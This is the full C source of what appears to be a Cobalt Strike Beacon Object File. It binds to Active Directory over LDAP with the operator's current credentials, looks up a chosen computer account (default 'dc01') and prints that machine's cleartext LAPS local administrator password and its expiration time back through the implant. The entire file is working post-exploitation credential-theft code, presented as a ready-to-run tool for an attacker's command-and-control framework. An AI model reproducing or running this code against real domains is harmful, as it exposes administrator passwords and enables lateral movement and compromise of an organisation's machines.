#include <windows.h>
#include <winldap.h>
#include <winber.h>
#include "beacon.h"

// Wldap32 imports
DECLSPEC_IMPORT LDAP* WLDAP32$ldap_initA(PCHAR HostName, ULONG PortNumber);
DECLSPEC_IMPORT ULONG WLDAP32$ldap_set_optionA(LDAP* ld, int option, void* invalue);
DECLSPEC_IMPORT ULONG WLDAP32$ldap_bind_sA(LDAP* ld, PCHAR dn, PCHAR cred, ULONG method);
DECLSPEC_IMPORT ULONG WLDAP32$ldap_search_sA(LDAP* ld, PCHAR base, ULONG scope, PCHAR filter, PCHAR attrs[], ULONG attrsonly, LDAPMessage** res);
DECLSPEC_IMPORT LDAPMessage* WLDAP32$ldap_first_entry(LDAP* ld, LDAPMessage* res);
DECLSPEC_IMPORT LDAPMessage* WLDAP32$ldap_next_entry(LDAP* ld, LDAPMessage* entry);
DECLSPEC_IMPORT PCHAR WLDAP32$ldap_first_attributeA(LDAP* ld, LDAPMessage* entry, BerElement** ptr);
DECLSPEC_IMPORT PCHAR WLDAP32$ldap_next_attributeA(LDAP* ld, LDAPMessage* entry, BerElement* ptr);
DECLSPEC_IMPORT PCHAR* WLDAP32$ldap_get_valuesA(LDAP* ld, LDAPMessage* entry, PCHAR attr);
DECLSPEC_IMPORT ULONG WLDAP32$ldap_value_freeA(PCHAR* vals);
DECLSPEC_IMPORT ULONG WLDAP32$ldap_msgfree(LDAPMessage* res);
DECLSPEC_IMPORT ULONG WLDAP32$ldap_unbind(LDAP* ld);
DECLSPEC_IMPORT ULONG WLDAP32$ldap_memfreeA(PCHAR Block);
DECLSPEC_IMPORT VOID WLDAP32$ber_free(BerElement* pBerElement, INT fbuf);
DECLSPEC_IMPORT ULONG WLDAP32$LdapGetLastError();

// Kernel32 imports
DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();

// MSVCRT imports
DECLSPEC_IMPORT int MSVCRT$strcmp(const char* str1, const char* str2);
DECLSPEC_IMPORT int MSVCRT$sprintf(char* buffer, const char* format, ...);
DECLSPEC_IMPORT char* MSVCRT$strcpy(char* dest, const char* src);
DECLSPEC_IMPORT int MSVCRT$_stricmp(const char* str1, const char* str2);

BOOL GetDefaultNamingContext(LDAP* ld, char* baseDN, int maxLen) {
    LDAPMessage* results = NULL;
    LDAPMessage* entry = NULL;
    PCHAR* values = NULL;
    PCHAR attrs[] = { "defaultNamingContext", NULL };
    ULONG result;

    result = WLDAP32$ldap_search_sA(
        ld,
        "",
        LDAP_SCOPE_BASE,
        "(objectClass=*)",
        attrs,
        0,
        &results
    );

    if (result != LDAP_SUCCESS) {
        return FALSE;
    }

    entry = WLDAP32$ldap_first_entry(ld, results);
    if (entry == NULL) {
        WLDAP32$ldap_msgfree(results);
        return FALSE;
    }

    values = WLDAP32$ldap_get_valuesA(ld, entry, "defaultNamingContext");
    if (values == NULL || values[0] == NULL) {
        WLDAP32$ldap_msgfree(results);
        return FALSE;
    }

    MSVCRT$strcpy(baseDN, values[0]);
    
    WLDAP32$ldap_value_freeA(values);
    WLDAP32$ldap_msgfree(results);
    
    return TRUE;
}

void go(char* args, int argc) {
    LDAP* ld = NULL;
    LDAPMessage* searchResult = NULL;
    LDAPMessage* entry = NULL;
    BerElement* ber = NULL;
    PCHAR attribute = NULL;
    PCHAR* values = NULL;
    ULONG result = 0;
    int version = LDAP_VERSION3;
    BOOL foundAny = FALSE;
    char baseDN[512] = {0};
    char filter[512] = {0};
    int resultCount = 0;

    // Request ALL attributes by passing NULL
    PCHAR attrs[] = { NULL };

    // Parse arguments (optional: computer name)
    datap parser;
    char computerName[256] = {0};
    
    if (argc > 0) {
        BeaconDataParse(&parser, args, argc);
        char* inputName = BeaconDataExtract(&parser, NULL);
        if (inputName && inputName[0] != '\0') {
            MSVCRT$sprintf(computerName, "%s", inputName);
        }
    }
    
    // Default to dc01
    if (computerName[0] == '\0') {
        MSVCRT$strcpy(computerName, "dc01");
    }

    // Build filter for specific computer
    MSVCRT$sprintf(filter, "(&(objectCategory=computer)(cn=%s))", computerName);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Connecting to LDAP...");
    
    // Initialize LDAP connection
    ld = WLDAP32$ldap_initA(NULL, LDAP_PORT);
    if (ld == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_init failed");
        return;
    }

    // Set LDAP version to 3
    result = WLDAP32$ldap_set_optionA(ld, LDAP_OPT_PROTOCOL_VERSION, &version);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_set_option failed: 0x%x", result);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    // Bind to LDAP (using current credentials)
    result = WLDAP32$ldap_bind_sA(ld, NULL, NULL, LDAP_AUTH_NEGOTIATE);
    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_bind failed: 0x%x", result);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Connected to LDAP");

    // Get the default naming context
    if (!GetDefaultNamingContext(ld, baseDN, sizeof(baseDN))) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve default naming context");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Base DN: %s", baseDN);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Searching for: %s", computerName);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Filter: %s", filter);

    // Perform LDAP search
    result = WLDAP32$ldap_search_sA(
        ld,
        baseDN,
        LDAP_SCOPE_SUBTREE,
        filter,
        attrs,
        0,
        &searchResult
    );

    if (result != LDAP_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "[-] ldap_search failed: 0x%x", result);
        WLDAP32$ldap_unbind(ld);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Search completed, processing results...");

    // Iterate through search results
    for (entry = WLDAP32$ldap_first_entry(ld, searchResult); 
         entry != NULL; 
         entry = WLDAP32$ldap_next_entry(ld, entry)) {
        
        resultCount++;
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] Found computer #%d", resultCount);
        
        // Get all attributes for this entry
        for (attribute = WLDAP32$ldap_first_attributeA(ld, entry, &ber);
             attribute != NULL;
             attribute = WLDAP32$ldap_next_attributeA(ld, entry, ber)) {
            
            values = WLDAP32$ldap_get_valuesA(ld, entry, attribute);
            
            if (values != NULL && values[0] != NULL) {
                // Check if this is a LAPS-related attribute
                if (MSVCRT$_stricmp(attribute, "ms-mcs-admpwd") == 0 ||
                    MSVCRT$_stricmp(attribute, "ms-Mcs-AdmPwd") == 0) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s: %s", attribute, values[0]);
                    foundAny = TRUE;
                }
                else if (MSVCRT$_stricmp(attribute, "ms-mcs-admpwdexpirationtime") == 0 ||
                         MSVCRT$_stricmp(attribute, "ms-Mcs-AdmPwdExpirationTime") == 0) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[+] %s: %s", attribute, values[0]);
                }
                else if (MSVCRT$_stricmp(attribute, "dnshostname") == 0 ||
                         MSVCRT$_stricmp(attribute, "cn") == 0 ||
                         MSVCRT$_stricmp(attribute, "name") == 0) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[*] %s: %s", attribute, values[0]);
                }
                
                WLDAP32$ldap_value_freeA(values);
            }
            
            WLDAP32$ldap_memfreeA(attribute);
        }

        if (ber != NULL) {
            WLDAP32$ber_free(ber, 0);
        }
    }

    if (resultCount == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] No computers found matching the filter");
    } else if (!foundAny) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Computer found but no LAPS password attribute present");
        BeaconPrintf(CALLBACK_OUTPUT, "[*] This could mean:");
        BeaconPrintf(CALLBACK_OUTPUT, "    - LAPS is not configured on this computer");
        BeaconPrintf(CALLBACK_OUTPUT, "    - You don't have permission to read the ms-mcs-admpwd attribute");
    }

    // Cleanup
    if (searchResult) {
        WLDAP32$ldap_msgfree(searchResult);
    }
    WLDAP32$ldap_unbind(ld);
    
    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Done");
}
